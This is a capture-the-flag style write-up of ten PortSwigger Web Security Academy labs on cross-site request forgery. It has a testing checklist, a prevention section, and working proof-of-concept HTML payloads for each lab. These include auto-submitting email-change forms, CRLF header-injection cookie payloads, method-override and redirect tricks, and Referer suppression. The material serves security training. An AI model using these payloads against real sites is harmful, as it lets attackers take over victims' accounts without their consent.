# Cross-Site Request Forgery (CSRF)

> PortSwigger Web Security Academy · **10/11** labs completed

CSRF makes a logged-in victim's browser send a state-changing request the victim never intended, using the cookies the browser attaches automatically.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. CSRF vulnerability with no defenses](#1-csrf-vulnerability-with-no-defenses)
- [2. CSRF where token validation depends on request method](#2-csrf-where-token-validation-depends-on-request-method)
- [3. CSRF where token validation depends on token being present](#3-csrf-where-token-validation-depends-on-token-being-present)
- [4. CSRF where token is not tied to user session](#4-csrf-where-token-is-not-tied-to-user-session)
- [5. CSRF where token is tied to non-session cookie](#5-csrf-where-token-is-tied-to-non-session-cookie)
- [6. CSRF where token is duplicated in cookie](#6-csrf-where-token-is-duplicated-in-cookie)
- [7. SameSite Lax bypass via method override](#7-samesite-lax-bypass-via-method-override)
- [8. SameSite Strict bypass via client-side redirect](#8-samesite-strict-bypass-via-client-side-redirect)
- [9. CSRF where Referer validation depends on header being present](#9-csrf-where-referer-validation-depends-on-header-being-present)
- [10. CSRF with broken Referer validation](#10-csrf-with-broken-referer-validation)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Confirm the app uses session-based (cookie) authentication rather than a token stored only in JS memory — CSRF needs the browser to auto-attach credentials.
- Identify every state-changing (not just GET) endpoint: change email/password, transfer funds, change settings, delete account.
- Check whether a CSRF token is present at all. If not, the endpoint is a direct candidate.
- If a token exists, check whether it is actually validated: remove it, send an empty value, or reuse another user's token.
- Check whether the token is tied to the session or just globally valid, and whether it's checked only for some HTTP methods (e.g. checked for POST but the endpoint also accepts GET).
- Check `SameSite` cookie attribute — `Strict` blocks most CSRF, `Lax` blocks POST but often allows top-level navigation and some GET-based actions, and method override headers can bypass Lax.
- Check `Origin` and `Referer` validation: is it present, is it checked on all methods, and is it skipped when the header is simply missing?
- Check for weaknesses in how Referer/Origin is matched (substring match instead of exact, or trusting a sibling subdomain).
- Build a PoC: auto-submitting HTML form or `fetch` with `credentials: 'include'` hosted on a different origin, and confirm it fires without user interaction (or with a single click).

## Lab write-ups

### 1. CSRF vulnerability with no defenses

**Lab:** [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

- Login to our account and the vuln exists in change email
- Craft a HTML forms, put it in the exploit server and send it

```html
<html>
<body>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="user@example.com"/>
<input type="submit" value="submitrequest"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

---

### 2. CSRF where token validation depends on request method

**Lab:** [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

-  This is same as the last lab but here CSRF is blocked in POST method so we use GET method

```html
<html>
<body>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
<input type="hidden" name="email" value="user@example.com"/>
<input type="submit" value="submitrequest"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

---

### 3. CSRF where token validation depends on token being present

**Lab:** [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

- In this lab the vuln is the server is checking whether the CSRF token is modified or not but it doesn't check for whether the token is there or not
- So we remove the token and send the request and the response is giving us 200 ok
- Craft the same CSRF payload like lab 1

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker123@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

### 4. CSRF where token is not tied to user session

**Lab:** [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

- In this lab the CSRF token is not bind to the session so when we copy another account current CSRF token and paste it to change another person's email id, it is getting changed.
- For example I copied the current CSRF token of carlos account and paste the same token here to change the email of wiener's mail id, I am able to change it
- So to do that refresh the page of carlos again because CSRF token is one time use and obtain the new token
- Add a input field in CSRF payload and paste the token in there and target wiener's account to change the email id
- Payload

```html
<html>
<body>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@example.com"/>
<input type="hidden" name="csrf" value="PmKuNivCNz2INPD0uGDGIXglt6NbL737"/>
<input type="submit" value="submitrequest"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

---

### 5. CSRF where token is tied to non-session cookie

**Lab:** [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

- In this lab there are 2 token which is CSRF key cookie and CSRF token and both are bind together. if we change any one token the request becomes invalid but it didn't bind with the session
- So when I use carlos's csrf key and csrf token in wiener's account, I am able to access the change email path
- So to exploit it first we need to set cookie the csrf key of carlos's to wiener. we can do it using search functionality using the url encoded search
- The payload is `hi%0d%0aSet-Cookie:%20csrfKey=XMvIhYfY4pKphbQnquYnytuXkNDAeBvw%3b%20SameSite=None`
- The decoded one is `hi\r\nSet-Cookie: csrfKey=XMvIhYfY4pKphbQnquYnytuXkNDAeBvw; SameSite=None`
- \r\n is used to break a line in http header and we are doing http header injection here
- So when we inject this payload the cookie has been set successfully
- Now craft the CSRF payload using the above set cookie and CSRF token

```html
<html>
<body>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="new-unique-address@example.com">
    <input type="hidden" name="csrf" value="EdoxRWVZL3a2HaaUok1QXoFYnu2AXgAl">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=XMvIhYfY4pKphbQnquYnytuXkNDAeBvw%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
</body>
</html>
```

- Here we used img tag to send the set cookie injection and we send the CSRF and CSRF key token at the same time and we have exploited it

---

### 6. CSRF where token is duplicated in cookie

**Lab:** [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

- In this lab there is a cookie called CSRF and there is a token called CSRF token. the validation of the token is just checking both are equal and doesn't check whether it has been changed
- And moreover whatever you search in search bar it is pointing to the setcookie header so we try to change the csrf cookie value to some random value `xyz`
- We can achieve ti by using the search bar using te payload `hi%0d%0aSet-Cookie:%20csrf=xyz%3b%20SameSite=None`
- Now we are able the change the CSRF cookie so we can now craft a CSRF payload like we used to do it for the last lab
- Use <img> `<img>` tag to change the cookie value and add the same value in CSRF field

```html
<html>
<body>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="new-unique-address@example.com">
    <input type="hidden" name="csrf" value="xyz">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=xyz%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
</body>
</html>
```

---

### 7. SameSite Lax bypass via method override

**Lab:** [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

- In this lab there is a vuln in method override
- We are able to override the method using aby method so we first try to change the email using the query parameter and used `_method` to override the method
- The payload is `/my-account/change-email?email=foo%40web-security-academy.net&_method=POST`
- Now we are able to change the email so now we craft the payload

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

- We use document.location to tell the browser's js that we are trying to access a new specific URL but document.location usually use GET method and to counter that we use `_method=POST` to override the method

---

### 8. SameSite Strict bypass via client-side redirect

**Lab:** [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

- In this lab the vuln exists in client side redirect where there is a redirected page comes when I submit a comment and for that endpoint I am able to do path traversal
- I tried `/post/comment/confirmation?postId=1/../my-account` and it redirects me to the account page so this is the endpoint we are going to exploit it
- Then when I change the method of change-email from POST to GET I am able to change the email
- So change the email and get the url and now write the payload to change the email using the post confirmation endpoint
- We are going to use that endpoint and then do path traversal to change email and add email to exploit this endpoint

```html
<script>
document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=xyz%40abc.com%26submit=1";
</script>
```

---

### 9. CSRF where Referer validation depends on header being present

**Lab:** [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

- In this lab the vuln exists in referer header
- The header check is oly whether the token is modified or not but doesn't check it is a must header so when I remove the header and change the mail I am able to do it
- To exploit this we write the basic CSRF payload from lab 1 but with this extra line where the referer is set to no-referer- `<meta name="referrer" content="no-referrer">`

```html
<html>
<body>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@example.com"/>
<input type="submit" value="submitreq"/>
<meta name="referrer" content="no-referrer">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

---

### 10. CSRF with broken Referer validation

**Lab:** [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

- In this lab the referer header validation is broken and it is only checking whether the host part is there in the referer header and doesn't check the full referer so if I add anything in the front or back of the referer and have the existing value, it is giving me 302
- So for example if I give like `Referer: https://abc.gmail.com?YOUR-LAB-ID.web-security-academy.net/my-account?id=wiener` it is validating only the query parameter because query parameter has the part it wants
- To exploit it we write the CSRF payload

```html
<html>
<head>
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
        history.pushState("","","/?YOUR-LAB-ID.web-security-academy.net");
        document.forms[0].submit();
    </script>
</body>
</html>
```

- history.pushstate() changes the URL displayed in the browser without reloading the page or moving the browser to another website
- With `unsafe-url`, the browser can send the full URL, including its path and query string, even in cross-origin requests. This can expose sensitive URL information, which is why the policy must be used carefully.

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Use anti-CSRF tokens that are unpredictable, tied to the user session, and checked on every state-changing request.
- Validate the token on all methods and reject requests where it is missing. Do not skip validation for a method or when the field is absent.
- Set `SameSite` cookies (Lax or Strict) as a second layer. Know their limits: method override, client-side redirects and sibling domains can weaken them.
- Check `Origin` or `Sec-Fetch-Site`. Do not rely on `Referer` alone, because it can be missing or tricked.
- Never change state with GET requests. Ask for re-authentication on sensitive actions.
